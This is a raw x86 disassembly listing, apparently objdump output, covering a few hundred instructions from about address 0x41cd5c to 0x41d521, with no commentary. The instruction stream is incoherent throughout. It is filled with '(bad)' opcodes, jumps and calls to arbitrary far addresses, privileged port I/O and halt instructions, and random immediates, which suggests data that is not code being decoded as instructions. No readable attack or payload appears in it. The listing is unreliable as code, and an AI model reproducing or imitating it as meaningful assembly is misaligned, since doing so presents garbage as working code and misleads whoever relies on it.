  41cd5c:	inc    DWORD PTR [esp+edx*2+0x5e23e8cd]
  41cd63:	cld    
  41cd64:	jmp    DWORD PTR [edx+0x17]
  41cd67:	push   ecx
  41cd68:	mov    DWORD PTR [eax+ebx*1],edx
  41cd6b:	push   edx
  41cd6c:	clc    
  41cd6d:	add    ch,bl
  41cd6f:	sbb    al,BYTE PTR [esi-0x75]
  41cd72:	fmul   QWORD PTR cs:[eax-0x75]
  41cd76:	push   ds
  41cd77:	aam    0xf0
  41cd79:	xchg   BYTE PTR [esi],ah
  41cd7b:	fmul   QWORD PTR [eax-0x18]
  41cd7e:	mov    edi,0xe3ffffb1
  41cd83:	popa   
  41cd84:	sti    
  41cd85:	jmp    FWORD PTR [ebp+0x5575ffbf]
  41cd8b:	and    eax,0xe84a2451
  41cd90:	adc    eax,edi
  41cd92:	xchg   ebp,eax
  41cd93:	ret    0x4d7f
  41cd96:	xor    ch,BYTE PTR [esi+0x61d718ac]
  41cd9c:	aas    
  41cd9d:	mov    edx,DWORD PTR [esi]
  41cd9f:	aam    0xec
  41cda1:	mov    BYTE PTR [ebx-0x2],ah
  41cda4:	mov    eax,ds:0x982f5e4f
  41cda9:	cld    
  41cdaa:	out    dx,eax
  41cdab:	mov    eax,0xea864b8a
  41cdb0:	lods   al,BYTE PTR ds:[esi]
  41cdb1:	in     eax,dx
  41cdb2:	dec    ebp
  41cdb3:	and    BYTE PTR [eax+0x49cc2230],0x48
  41cdba:	imul   esi,DWORD PTR [edx-0x68],0xd5b549d7
  41cdc1:	mov    edi,0x593c0095
  41cdc6:	loope  0x41ce36
  41cdc8:	iret   
  41cdc9:	rcr    DWORD PTR [esi-0x4e],0x2e
  41cdcd:	dec    edi
  41cdce:	mov    cl,0xdd
  41cdd0:	mov    DWORD PTR ss:[eax],eax
  41cdd3:	mov    ss,WORD PTR [esi-0x1fd6cf05]
  41cdd9:	(bad)  
  41cdda:	neg    cl
  41cddc:	fsubp  st(0),st
  41cdde:	and    ebp,eax
  41cde0:	fnstenv [esi]
  41cde2:	mov    bl,BYTE PTR [ecx-0x6e740a0b]
  41cde8:	cmc    
  41cde9:	test   BYTE PTR [esp+ebp*8-0x7d7a2533],0xda
  41cdf1:	jmp    0x6731b8f9
  41cdf6:	sahf   
  41cdf7:	pop    ecx
  41cdf8:	shl    BYTE PTR [edi+0x11],1
  41cdfb:	(bad)
  41cdfe:	fadd   st(4),st
  41ce00:	shr    BYTE PTR [edx+0x9],1
  41ce03:	mov    ch,0xc0
  41ce05:	jmp    0x5f16ed96
  41ce0a:	ret    0x1582
  41ce0d:	(bad)  
  41ce0e:	call   FWORD PTR [edx+0x15]
  41ce11:	into   
  41ce12:	jmp    DWORD PTR [esi+0x56]
  41ce15:	sbb    eax,DWORD PTR [ebx]
  41ce17:	(bad)  
  41ce18:	fsqrt  
  41ce1a:	rol    DWORD PTR [ebp+0x6ec3e9c0],0x55
  41ce21:	mov    bh,0x4
  41ce23:	(bad)  
  41ce24:	fldenv [ebp-0x4e]
  41ce27:	icebp  
  41ce28:	int3   
  41ce29:	fcmovb st,st(5)
  41ce2b:	gs shr cl,0x43
  41ce2f:	outs   dx,DWORD PTR ds:[esi]
  41ce30:	push   ebp
  41ce31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce32:	add    al,0x62
  41ce34:	fldcw  WORD PTR [esi-0x4b]
  41ce37:	add    ah,cl
  41ce39:	mov    ebx,0x596203e9
  41ce3e:	xor    eax,0xce153f08
  41ce43:	imul   edx
  41ce45:	adc    al,0xc6
  41ce47:	jmp    DWORD PTR [ebp-0x51b3c9bb]
  41ce4d:	sub    ah,BYTE PTR [edx]
  41ce4f:	dec    esp
  41ce50:	xchg   esi,eax
  41ce51:	or     ah,BYTE PTR [edi-0x54]
  41ce54:	popa   
  41ce55:	inc    ebp
  41ce56:	sub    al,BYTE PTR [ebx-0x2ff2efb]
  41ce5c:	cld    
  41ce5d:	pop    eax
  41ce5e:	call   0x8b9e3b3c
  41ce63:	jmp    0xfde3a7c9
  41ce68:	cmp    eax,0x9c120115
  41ce6d:	ror    DWORD PTR [ebx],1
  41ce6f:	fs out 0xbf,eax
  41ce72:	sti    
  41ce73:	jmp    0x654d7862
  41ce78:	cmp    al,al
  41ce7a:	sti    
  41ce7b:	jmp    0x95c58db3
  41ce80:	(bad)
  41ce83:	pushf  
  41ce84:	call   0x9fa60795
  41ce89:	dec    edx
  41ce8a:	add    esp,DWORD PTR [edx-0xf]
  41ce8d:	push   eax
  41ce8e:	mov    DWORD PTR [edx],0x721150bf
  41ce94:	daa    
  41ce95:	aad    0xe7
  41ce97:	mov    ebx,0x622924d8
  41ce9c:	add    BYTE PTR ds:0xe8c3e7ed,dl
  41cea2:	and    al,0x11
  41cea4:	jb     0x41ceca
  41cea6:	in     eax,0xe7
  41cea8:	or     esp,ecx
  41ceaa:	cmp    al,0x5
  41ceac:	call   0xa9359ffb
  41ceb1:	popa   
  41ceb2:	jmp    0xcfbcb7b7
  41ceb7:	jg     0x41cef7
  41ceb9:	pop    edx
  41ceba:	fdiv   DWORD PTR [ebp-0x10]
  41cebd:	in     al,dx
  41cebe:	jg     0x41cec0
  41cec0:	or     DWORD PTR [esi-0x27],esp
  41cec3:	je     0x41ce9d
  41cec5:	call   0x9cb3d7ef
  41ceca:	int    0x7f
  41cecc:	xchg   esp,eax
  41cecd:	push   ebp
  41cece:	inc    ebp
  41cecf:	push   ds
  41ced0:	push   0xffffffc2
  41ced2:	jmp    0xf43e:0x6a2a0072
  41ced9:	and    dl,BYTE PTR ds:0xc327511
  41cedf:	push   edx
  41cee0:	push   ebx
  41cee1:	pop    edx
  41cee2:	push   0xb3930c4d
  41cee7:	pop    es
  41cee8:	dec    DWORD PTR [ecx+edx*2+0x680278bb]
  41ceef:	inc    ebp
  41cef0:	add    al,0xcb
  41cef2:	fiadd  DWORD PTR [eax]
  41cef4:	xor    BYTE PTR [eax],0x55
  41cef7:	mov    DWORD PTR [edi+eiz*2-0x36],edx
  41cefb:	mov    BYTE PTR [edi+edx*2-0x4f],cl
  41ceff:	sub    BYTE PTR [esi],cl
  41cf01:	add    al,cl
  41cf03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf04:	or     BYTE PTR [edi+eiz*4-0x4a],0x80
  41cf09:	stc    
  41cf0a:	mov    edi,0x4de781cf
  41cf0f:	pop    edi
  41cf10:	cld    
  41cf11:	test   BYTE PTR [ecx-0x1f],bl
  41cf14:	add    bh,BYTE PTR [ecx]
  41cf16:	mov    edi,0x78750fb6
  41cf1b:	stos   DWORD PTR es:[edi],eax
  41cf1c:	fadd   DWORD PTR [ebx+0x1]
  41cf1f:	fwait
  41cf20:	pop    esp
  41cf21:	pop    esi
  41cf22:	out    dx,al
  41cf23:	add    edx,DWORD PTR [ecx+ebx*2-0x37]
  41cf27:	jmp    0x70fd012c
  41cf2c:	lock push ebx
  41cf2e:	es push eax
  41cf30:	addr16 and al,0x3f
  41cf33:	add    al,0x8a
  41cf35:	push   ebp
  41cf36:	aaa    
  41cf37:	add    eax,0x8bc6f98a
  41cf3c:	or     al,0x84
  41cf3e:	inc    ecx
  41cf3f:	fild   DWORD PTR [eax]
  41cf41:	add    ch,dh
  41cf43:	adc    edx,DWORD PTR [ecx+0x2]
  41cf46:	sub    al,0x57
  41cf48:	sti    
  41cf49:	add    BYTE PTR [ebx],bh
  41cf4b:	fidiv  DWORD PTR [ecx]
  41cf4d:	(bad)  [edx-0xd]
  41cf50:	xlat   BYTE PTR ds:[ebx]
  41cf51:	pop    esp
  41cf52:	jp     0x41cef3
  41cf54:	xor    bl,0x62
  41cf57:	mov    al,0xff
  41cf59:	or     BYTE PTR [ebp-0x21f30064],0x59
  41cf60:	add    al,0x0
  41cf62:	bound  esi,QWORD PTR [ecx]
  41cf64:	push   ds
  41cf65:	sbb    al,0x0
  41cf67:	bound  esi,QWORD PTR [eax+0x375cffef]
  41cf6d:	mov    esp,0xa7afe5ff
  41cf72:	cwde   
  41cf73:	ja     0x41cf25
  41cf75:	inc    DWORD PTR [edx-0x307d395e]
  41cf7b:	bound  esi,QWORD PTR [eax-0x4bdfe101]
  41cf81:	mov    BYTE PTR [edx+0x56],cl
  41cf84:	sbb    BYTE PTR [eax],dl
  41cf86:	push   ss
  41cf87:	bound  esi,QWORD PTR [eax-0x1a181078]
  41cf8d:	or     eax,0xffaffa84
  41cf92:	(bad)  
  41cf93:	jmp    0x3629c2f4
  41cf98:	sahf   
  41cf99:	(bad)  
  41cf9a:	(bad)  
  41cf9b:	fincstp 
  41cf9d:	sbb    eax,0x55
  41cfa0:	sub    al,0x72
  41cfa2:	(bad)  
  41cfa3:	jge    0x41cf54
  41cfa5:	sub    DWORD PTR [eax],eax
  41cfa7:	jne    0x41cfc7
  41cfa9:	adc    DWORD PTR [ecx+0x8149e9c],ecx
  41cfaf:	jp     0x41cf89
  41cfb1:	inc    esp
  41cfb2:	add    BYTE PTR [edx+0x37],ah
  41cfb5:	mov    al,0x88
  41cfb7:	and    al,0xab
  41cfb9:	and    edx,DWORD PTR [ebx]
  41cfbb:	bound  esi,QWORD PTR [edx+0xdcebf83]
  41cfc1:	rol    dh,cl
  41cfc3:	jnp    0x41cfa0
  41cfc5:	push   eax
  41cfc6:	jae    0x41cf51
  41cfc8:	(bad)  [edi]
  41cfca:	hlt    
  41cfcb:	add    BYTE PTR [esp+edi*4+0x15a74bd4],bl
  41cfd2:	jmp    0x6243:0xf9bd709c
  41cfd9:	push   esi
  41cfda:	test   eax,0xb1085f17
  41cfdf:	mov    ebx,DWORD PTR [ebp+0x52]
  41cfe2:	and    DWORD PTR [eax],ecx
  41cfe4:	in     eax,0x11
  41cfe6:	loop   0x41cf72
  41cfe8:	popf   
  41cfe9:	int    0x4e
  41cfeb:	add    DWORD PTR [ebx],esi
  41cfed:	cdq    
  41cfee:	jo     0x41d034
  41cff0:	xchg   esi,eax
  41cff1:	push   esi
  41cff2:	sub    DWORD PTR [edi],edx
  41cff4:	cmp    ebx,DWORD PTR [ecx+0xe]
  41cff7:	add    al,0xeb
  41cff9:	enter  0xefbd,0xba
  41cffd:	(bad)  
  41cffe:	std    
  41cfff:	fcom   DWORD PTR [ecx-0x2c]
  41d002:	stos   DWORD PTR es:[edi],eax
  41d003:	mov    DWORD PTR [edi+0x55],esp
  41d006:	sub    DWORD PTR [esi],edx
  41d008:	mov    cl,0x0
  41d00a:	pop    ss
  41d00b:	adc    eax,0x4faa505c
  41d010:	fist   DWORD PTR [ebx+0x282dc0be]
  41d016:	add    bh,ch
  41d018:	outs   dx,DWORD PTR ds:[esi]
  41d019:	fldl2t 
  41d01b:	or     DWORD PTR [edi-0x27],0x75
  41d01f:	or     ebx,DWORD PTR [eax+edx*2]
  41d022:	adc    eax,DWORD PTR [ebx-0x478b26c1]
  41d028:	jmp    0xe9e6:0x99abfe0e
  41d02f:	add    eax,DWORD PTR [eax]
  41d031:	fcmovne st,st(1)
  41d033:	ins    BYTE PTR es:[edi],dx
  41d034:	xchg   edx,eax
  41d035:	outs   dx,BYTE PTR ds:[esi]
  41d036:	push   esi
  41d037:	cs fwait
  41d039:	push   esi
  41d03a:	mov    esp,0x50a2bef6
  41d03f:	and    cl,BYTE PTR [eax-0x1f]
  41d042:	cwde   
  41d043:	add    BYTE PTR ds:0xe5785a60,bh
  41d049:	popa   
  41d04a:	ds (bad) 
  41d04c:	fldlg2 
  41d04e:	push   ecx
  41d04f:	mov    edi,0xc1075c92
  41d054:	ss pop eax
  41d056:	and    BYTE PTR [eax-0x55],bl
  41d059:	(bad)  
  41d05a:	fst    DWORD PTR [ebp+0x72]
  41d05d:	mov    edx,0x53cdec58
  41d062:	mov    BYTE PTR es:[eax-0x32],bh
  41d066:	call   0x55a3b97f
  41d06b:	shl    dh,0x6d
  41d06e:	call   0x2fa3b974
  41d073:	jmp    DWORD PTR [ebx+0x2b]
  41d076:	leave  
  41d077:	call   0xfbfc6f7a
  41d07c:	jb     0x41d00e
  41d07e:	int    0x8d
  41d080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d081:	cmc    
  41d082:	or     edx,DWORD PTR [edx+0x62]
  41d085:	sub    cl,dl
  41d087:	call   0xfbfe2a0c
  41d08c:	ins    BYTE PTR es:[edi],dx
  41d08d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d08e:	int3   
  41d08f:	test   DWORD PTR [ebx],edx
  41d091:	pop    esi
  41d092:	fld    DWORD PTR [eax]
  41d094:	pop    ds
  41d095:	add    BYTE PTR [ebx],ah
  41d097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d098:	(bad)  
  41d099:	fst    QWORD PTR ds:0x61e9009c
  41d09f:	into   
  41d0a0:	mov    bl,0xa4
  41d0a2:	retf   
  41d0a3:	or     ecx,DWORD PTR [esi+edi*1]
  41d0a6:	and    ebx,DWORD PTR [ebp+0x5069a6ff]
  41d0ac:	dec    ebp
  41d0ad:	fnstenv [ecx]
  41d0af:	mov    cl,0x82
  41d0b1:	test   al,0x5e
  41d0b3:	fnstcw WORD PTR [ebx+0xfac1eb]
  41d0b9:	inc    ebx
  41d0ba:	pop    edi
  41d0bb:	and    al,0x8e
  41d0bd:	add    BYTE PTR [esi-0x5891c9b],dl
  41d0c3:	aad    0x0
  41d0c5:	mov    eax,DWORD PTR [ebp+0x45f2e3b5]
  41d0cb:	xlat   BYTE PTR ds:[ebx]
  41d0cc:	add    BYTE PTR [ebx],al
  41d0ce:	sti    
  41d0cf:	push   es
  41d0d0:	(bad)  
  41d0d1:	jbe    0x41d0ee
  41d0d3:	push   edx
  41d0d4:	inc    esi
  41d0d5:	lock jecxz 0x41d0ce
  41d0d8:	mov    ebx,0xfbed0b01
  41d0dd:	push   esi
  41d0de:	xchg   esi,eax
  41d0df:	adc    ecx,esi
  41d0e1:	call   0x3c6554
  41d0e6:	adc    BYTE PTR [eax],0x25
  41d0e9:	call   0x3d71c8
  41d0ee:	clc    
  41d0ef:	xchg   esi,eax
  41d0f0:	dec    ebx
  41d0f1:	dec    DWORD PTR ds:0x3b4d869b
  41d0f7:	outs   dx,BYTE PTR ds:[esi]
  41d0f8:	cmp    al,0xc1
  41d0fa:	add    dl,cl
  41d0fc:	(bad)  
  41d0fd:	dec    ebx
  41d0fe:	(bad)  
  41d0ff:	(bad)  
  41d100:	bound  ecx,QWORD PTR [ebx-0x73]
  41d103:	mul    BYTE PTR [esi-0x1d]
  41d106:	iret   
  41d107:	mov    dl,ch
  41d109:	add    BYTE PTR [ebp+0xe366d6],cl
  41d10f:	jp     0x41d0e6
  41d111:	add    BYTE PTR [ebx+0x1689cece],cl
  41d117:	push   cs
  41d118:	test   BYTE PTR [edi+0x1c],ch
  41d11b:	mov    eax,0x93423296
  41d120:	call   0xbb135c60
  41d125:	mov    BYTE PTR [ebp+0x77],bh
  41d128:	sahf   
  41d129:	xor    dh,BYTE PTR [esi+eiz*8+0x16]
  41d12d:	add    cl,0x7f
  41d130:	popf   
  41d131:	inc    ecx
  41d132:	or     BYTE PTR [ecx],cl
  41d134:	fs call 0x9583366
  41d13a:	push   0x62
  41d13c:	mov    ecx,ebx
  41d13e:	inc    edi
  41d13f:	int    0xec
  41d141:	add    al,0xfd
  41d143:	outs   dx,DWORD PTR ds:[esi]
  41d144:	jl     0x41d13a
  41d146:	aas    
  41d147:	bound  ebp,QWORD PTR ds:0x2f5273c5
  41d14d:	and    eax,0x252f6204
  41d152:	or     BYTE PTR [edx+0x73],ah
  41d155:	add    al,0x30
  41d157:	ret    0x4ef
  41d15a:	jmp    0x870170bf
  41d15f:	add    BYTE PTR [ebp+ebp*1-0x3b],ah
  41d163:	jae    0x41d1cd
  41d165:	inc    edi
  41d166:	pop    es
  41d167:	mov    edx,DWORD PTR [edi-0x6c0171bc]
  41d16d:	sub    esi,DWORD PTR ds:0x84c1d90c
  41d173:	jbe    0x41d1cf
  41d175:	stos   DWORD PTR es:[edi],eax
  41d176:	adc    DWORD PTR ds:0x2dc0e9,eax
  41d17c:	aad    0x7d
  41d17e:	sti    
  41d17f:	scas   eax,DWORD PTR es:[edi]
  41d180:	arpl   WORD PTR [edi],sp
  41d182:	or     ecx,DWORD PTR [ebx-0x7952ffe9]
  41d188:	mov    ds:0xa231ffb0,al
  41d18d:	dec    edx
  41d18e:	cmp    edi,eax
  41d190:	mov    al,ds:0xb67effab
  41d195:	ret    
  41d196:	(bad)  
  41d197:	jmp    DWORD PTR [edx+0x7f]
  41d19a:	sub    dl,BYTE PTR [esi+0x2d]
  41d19d:	aaa    
  41d19e:	nop
  41d19f:	xor    BYTE PTR [ecx+0x31082f46],ch
  41d1a5:	mov    ebx,0xd8bf0c11
  41d1aa:	xchg   ebx,eax
  41d1ab:	push   DWORD PTR [ebp+0x36]
  41d1ae:	les    ecx,FWORD PTR [eax+0x3770d869]
  41d1b4:	ds fst st(1)
  41d1b7:	test   esi,ebp
  41d1b9:	fucompp 
  41d1bb:	mov    ah,BYTE PTR [ecx-0x50250e03]
  41d1c1:	int    0x43
  41d1c3:	hlt    
  41d1c4:	add    dl,bl
  41d1c6:	pminub mm6,QWORD PTR [edi+edi*1]
  41d1ca:	xor    dh,bl
  41d1cc:	mov    WORD PTR [eax],gs
  41d1ce:	ret    0x893e
  41d1d1:	sub    al,0xb9
  41d1d3:	mov    es,WORD PTR ds:0xac6e9cdb
  41d1d9:	in     al,0x1d
  41d1db:	into   
  41d1dc:	repz fadd QWORD PTR [ebp-0x3a]
  41d1e0:	not    DWORD PTR [ebp+edx*1-0x32]
  41d1e4:	sti    
  41d1e5:	push   esi
  41d1e6:	pop    ebp
  41d1e7:	or     DWORD PTR [ebx],eax
  41d1e9:	(bad)  
  41d1ea:	fldcw  WORD PTR [ebx+eax*8+0x70]
  41d1ee:	loop   0x41d1a0
  41d1f0:	cmp    DWORD PTR [esi-0x18],edx
  41d1f3:	jb     0x41d229
  41d1f5:	in     eax,0xb8
  41d1f7:	jmp    0xfe3efb82
  41d1fc:	stos   DWORD PTR es:[edi],eax
  41d1fd:	or     dl,cl
  41d1ff:	call   0x251ad07
  41d204:	jg     0x41d1b9
  41d206:	sub    eax,0xdd1bdac3
  41d20b:	mov    ebp,0xd237e325
  41d210:	add    dh,BYTE PTR [ecx]
  41d212:	and    DWORD PTR [ebp+0x3f],esi
  41d215:	jle    0x41d210
  41d217:	mov    ecx,0x5edd1398
  41d21c:	cmc    
  41d21d:	int3   
  41d21e:	ret    0x30c
  41d221:	(bad)  
  41d223:	fimul  DWORD PTR [eax-0x6491477c]
  41d229:	add    al,ah
  41d22b:	mov    eax,0xd1f5e600
  41d230:	add    ecx,ebp
  41d232:	popa   
  41d233:	bound  edi,QWORD PTR [edi+0x20fd2220]
  41d239:	pop    edi
  41d23a:	xchg   esi,eax
  41d23b:	out    0xb3,al
  41d23d:	in     eax,0x94
  41d23f:	pop    edx
  41d240:	stc    
  41d241:	pop    es
  41d242:	jb     0x41d224
  41d244:	jg     0x41d206
  41d246:	cmp    DWORD PTR [ebx],ebp
  41d248:	or     BYTE PTR [ebx+0x46],dl
  41d24b:	sar    esi,0x42
  41d24e:	push   0x5a606310
  41d253:	push   ds
  41d254:	inc    ecx
  41d255:	loop   0x41d2bc
  41d257:	std    
  41d258:	and    BYTE PTR ds:0x32ac0c6,bl
  41d25e:	cmp    ah,BYTE PTR [ebx+0x54]
  41d261:	(bad)  
  41d264:	jmp    0xfbf78cef
  41d269:	adc    ebp,DWORD PTR [edi+0x64]
  41d26c:	dec    esp
  41d26d:	int    0x9
  41d26f:	ror    DWORD PTR [esi],0x3
  41d272:	or     DWORD PTR [ebx+0x54],esp
  41d275:	or     eax,0x52e90ef6
  41d27a:	or     dh,BYTE PTR [esi+0x62d4c3fb]
  41d280:	dec    esp
  41d281:	add    eax,0x28e911be
  41d286:	dec    ebx
  41d287:	mov    bh,0xfb
  41d289:	jb     0x41d269
  41d28b:	pop    edx
  41d28c:	sti    
  41d28d:	out    0x0,al
  41d28f:	xor    eax,0x61e90072
  41d294:	(bad)  
  41d295:	retf   0xfa11
  41d298:	out    0x0,al
  41d29a:	jmp    0xdfb64abc
  41d29f:	dec    ebx
  41d2a0:	test   DWORD PTR [ebp+0x738275],0x53db7b00
  41d2aa:	call   0x3f53cf
  41d2af:	ins    BYTE PTR es:[edi],dx
  41d2b0:	in     eax,0x24
  41d2b2:	lea    eax,[edi]
  41d2b4:	mov    ecx,0xdb7b00b7
  41d2b9:	std    
  41d2ba:	jbe    0x41d327
  41d2bc:	in     eax,dx
  41d2bd:	xchg   DWORD PTR [edi+eiz*2-0x3b],eax
  41d2c1:	push   eax
  41d2c2:	push   eax
  41d2c3:	and    esi,ecx
  41d2c5:	cmp    eax,0x67643b00
  41d2ca:	and    al,0x3b
  41d2cc:	mov    edx,es
  41d2ce:	add    DWORD PTR [edi],0xffffffc7
  41d2d1:	jle    0x41d293
  41d2d3:	or     al,0x1a
  41d2d5:	in     al,0x6a
  41d2d7:	inc    ecx
  41d2d8:	bound  ecx,QWORD PTR [edi+0x24]
  41d2db:	push   edi
  41d2dc:	hlt    
  41d2dd:	call   0xfc8eb26a
  41d2e2:	push   0x1e
  41d2e4:	bound  ecx,QWORD PTR [edi+0x24]
  41d2e7:	pop    ds
  41d2e8:	imul   al
  41d2ea:	jl     0x41d2db
  41d2ec:	dec    esp
  41d2ed:	cld    
  41d2ee:	mov    bh,BYTE PTR ds:0x7489ed
  41d2f4:	daa    
  41d2f5:	(bad)  
  41d2f6:	push   esp
  41d2f7:	mov    edx,0x3c2f43
  41d2fc:	push   eax
  41d2fd:	cwde   
  41d2fe:	jle    0x41d2ed
  41d300:	mov    esp,0x4050c019
  41d305:	cwde   
  41d306:	mov    BYTE PTR [edi+edx*2-0x4b],dl
  41d30a:	jle    0x41d302
  41d30c:	int3   
  41d30d:	sbb    ebx,eax
  41d30f:	push   eax
  41d310:	inc    esi
  41d311:	push   0x1adb04b3
  41d316:	add    DWORD PTR [edi],ecx
  41d318:	neg    BYTE PTR [eax-0x27b509b5]
  41d31e:	mov    dh,0x38
  41d320:	bound  ebp,QWORD PTR [esi]
  41d322:	inc    eax
  41d323:	add    bh,bl
  41d325:	jl     0x41d302
  41d327:	inc    edi
  41d328:	push   ebp
  41d329:	test   cl,al
  41d32b:	dec    edi
  41d32c:	jmp    0x126daead
  41d331:	cmp    eax,0x51fa242c
  41d336:	cs push eax
  41d338:	clc    
  41d339:	mov    edi,0xc123f637
  41d33e:	add    al,0x93
  41d340:	and    al,BYTE PTR [ebx-0x3b]
  41d343:	or     BYTE PTR [edx+0x63970f98],dh
  41d349:	rol    BYTE PTR [eax-0x42d5753d],0xe8
  41d350:	pop    esi
  41d351:	cmp    edx,DWORD PTR [ecx]
  41d353:	and    al,0x56
  41d355:	cmp    eax,esp
  41d357:	out    0x0,eax
  41d359:	cli    
  41d35a:	call   0x42bd35e
  41d35f:	loope  0x41d370
  41d361:	or     ch,BYTE PTR [edi]
  41d363:	dec    eax
  41d364:	dec    DWORD PTR ds:0x6a24493b
  41d36a:	dec    eax
  41d36b:	push   0x46
  41d36d:	arpl   ax,ax
  41d36f:	mov    ch,cl
  41d371:	or     bh,BYTE PTR [edi]
  41d373:	dec    eax
  41d374:	(bad)  
  41d375:	in     eax,dx
  41d376:	cmp    al,dh
  41d378:	out    0xda,eax
  41d37a:	push   0x763dfffe
  41d37f:	xor    cl,BYTE PTR [edx-0x3c81955f]
  41d385:	jbe    0x41d348
  41d387:	(bad)  
  41d388:	jmp    DWORD PTR [ecx+0x170ba942]
  41d38e:	sub    ebp,DWORD PTR [eax-0x288b16ab]
  41d394:	xor    BYTE PTR [esi+edx*4-0x269d0a85],0xe9
  41d39c:	add    ebp,ebx
  41d39e:	es out 0x7e,al
  41d3a1:	pushf  
  41d3a2:	in     eax,0x6d
  41d3a4:	test   eax,0x88e9b58d
  41d3a9:	and    BYTE PTR ds:0x5d6ec46d,ah
  41d3af:	or     DWORD PTR [edx+eiz*2],eax
  41d3b2:	fldenv [esi+0x1c]
  41d3b5:	data16 (bad) 
  41d3b8:	test   DWORD PTR [edi+0x3e9d8],ecx
  41d3be:	jmp    0x41d3ab
  41d3c0:	shl    BYTE PTR ss:[ebx],cl
  41d3c3:	addr16 cmc 
  41d3c5:	shl    ch,cl
  41d3c7:	or     eax,0xa88b0506
  41d3cc:	repnz cmp al,0xd9
  41d3d0:	jmp    0xaba262d8
  41d3d5:	shr    BYTE PTR [esi],1
  41d3d7:	arpl   WORD PTR ds:0x96f051e0,sp
  41d3dd:	adc    BYTE PTR [eax+0x5f],bh
  41d3e0:	jmp    0x41d365
  41d3e2:	or     al,0xfc
  41d3e4:	sbb    eax,0xccb2e205
  41d3e9:	push   cs
  41d3ea:	popa   
  41d3eb:	pop    esi
  41d3ec:	add    BYTE PTR [esi+eiz*4],0xb3
  41d3f0:	and    ebx,ecx
  41d3f2:	repnz daa 
  41d3f4:	cmp    BYTE PTR [esi-0x12],0x2e
  41d3f8:	call   0x5732bb85
  41d3fd:	adc    ch,bl
  41d3ff:	push   ds
  41d400:	setl   BYTE PTR [ecx+0x33]
  41d404:	pop    edi
  41d405:	ds push ds
  41d407:	pop    eax
  41d408:	leave  
  41d409:	pop    es
  41d40a:	(bad)  
  41d40b:	ror    ah,0x88
  41d40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40f:	rcr    DWORD PTR [eax+ebx*8],0xb5
  41d413:	mov    ah,0x0
  41d415:	repnz out dx,al
  41d417:	daa    
  41d418:	push   edi
  41d419:	xchg   esi,eax
  41d41a:	into   
  41d41b:	sub    BYTE PTR ds:0x2528f701,ah
  41d421:	leave  
  41d422:	add    dh,ch
  41d424:	(bad)  
  41d425:	pusha  
  41d426:	jmp    DWORD PTR [ecx]
  41d428:	fnstcw WORD PTR [edi+0x25]
  41d42b:	pop    ebp
  41d42c:	pop    eax
  41d42d:	sar    BYTE PTR [ebp+edi*1+0x62],0x4c
  41d432:	lds    eax,FWORD PTR [ebp-0x373d059f]
  41d438:	icebp  
  41d439:	out    dx,eax
  41d43a:	je     0x41d4ad
  41d43c:	popa   
  41d43d:	inc    ebp
  41d43e:	and    DWORD PTR ds:0xe1fc72dc,ebp
  41d444:	sub    bh,ah
  41d446:	packssdw mm1,mm6
  41d449:	inc    ebx
  41d44a:	ret    0x614a
  41d44d:	mov    edi,0x53242812
  41d452:	sbb    cl,dl
  41d454:	(bad)  
  41d455:	pop    esp
  41d456:	fbld   TBYTE PTR [ecx+0x62a57fd9]
  41d45c:	add    dh,ah
  41d45e:	rcl    al,cl
  41d460:	pusha  
  41d461:	dec    ebp
  41d462:	loope  0x41d4b2
  41d464:	bound  eax,QWORD PTR [ecx-0x13]
  41d467:	sub    al,0x9d
  41d469:	push   eax
  41d46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d46b:	call   0xcd5d:0xd9e817fd
  41d472:	call   0x258f36d8
  41d477:	into   
  41d478:	inc    edi
  41d479:	adc    ecx,ebp
  41d47b:	popa   
  41d47c:	pop    esp
  41d47d:	inc    esp
  41d47e:	or     eax,0xd4c056ce
  41d483:	push   esp
  41d484:	icebp  
  41d485:	out    dx,eax
  41d486:	out    0x0,al
  41d488:	out    0x1a,eax
  41d48a:	cld    
  41d48b:	dec    esi
  41d48c:	icebp  
  41d48d:	popa   
  41d48e:	push   esp
  41d48f:	add    BYTE PTR [edi-0x54],ch
  41d492:	pop    esp
  41d493:	mov    cl,BYTE PTR [ecx-0x56fd15fc]
  41d499:	xchg   edi,eax
  41d49a:	pop    ebp
  41d49b:	pop    ebp
  41d49c:	cmp    BYTE PTR [ecx+0x7908c307],ah
  41d4a2:	addr16 push ebx
  41d4a4:	into   
  41d4a5:	icebp  
  41d4a6:	push   ebp
  41d4a7:	push   0xdcbc
  41d4ac:	loope  0x41d485
  41d4ae:	std    
  41d4af:	xor    eax,0x44c6b3
  41d4b4:	lock dec ebp
  41d4b6:	mov    dl,ch
  41d4b8:	add    dl,cl
  41d4ba:	and    al,0x28
  41d4bc:	je     0x41d46e
  41d4be:	not    DWORD PTR [eax]
  41d4c0:	mov    ebx,ebp
  41d4c2:	mov    eax,ebx
  41d4c4:	mov    esi,0x69076e83
  41d4c9:	popf   
  41d4ca:	loop   0x41d4fe
  41d4cc:	cmp    dl,bh
  41d4ce:	add    BYTE PTR [edx+0x1e],ch
  41d4d1:	xor    al,0xd1
  41d4d3:	pop    ecx
  41d4d4:	enter  0xfc97,0xc6
  41d4d8:	jg     0x41d49b
  41d4da:	adc    al,0x0
  41d4dc:	and    esi,ebp
  41d4de:	out    0xfe,al
  41d4e0:	les    esi,FWORD PTR [ebx]
  41d4e2:	dec    edi
  41d4e3:	add    BYTE PTR [eax+0x481566d8],dl
  41d4e9:	push   ebp
  41d4ea:	stc    
  41d4eb:	dec    eax
  41d4ec:	add    dl,bh
  41d4ee:	(bad)  
  41d4ef:	mov    eax,edx
  41d4f1:	jb     0x41d4dd
  41d4f3:	and    al,0x18
  41d4f5:	jle    0x41d563
  41d4f7:	or     al,0x84
  41d4f9:	jno    0x41d4d1
  41d4fb:	add    BYTE PTR [eax],al
  41d4fd:	mov    ebp,0xca17251a
  41d502:	pop    ebx
  41d503:	cld    
  41d504:	jmp    FWORD PTR [esi+0x62406718]
  41d50a:	cmp    eax,0x69862434
  41d50f:	xchg   edi,eax
  41d510:	push   ss
  41d511:	enter  0x8f1a,0x8a
  41d515:	es fsubr st(0),st
  41d518:	out    0x42,eax
  41d51a:	inc    DWORD PTR [eax+eax*1]
  41d51d:	fiadd  WORD PTR [eax]
  41d51f:	adc    al,0x2d
  41d521:	ins    DWORD PTR es:[edi],dx
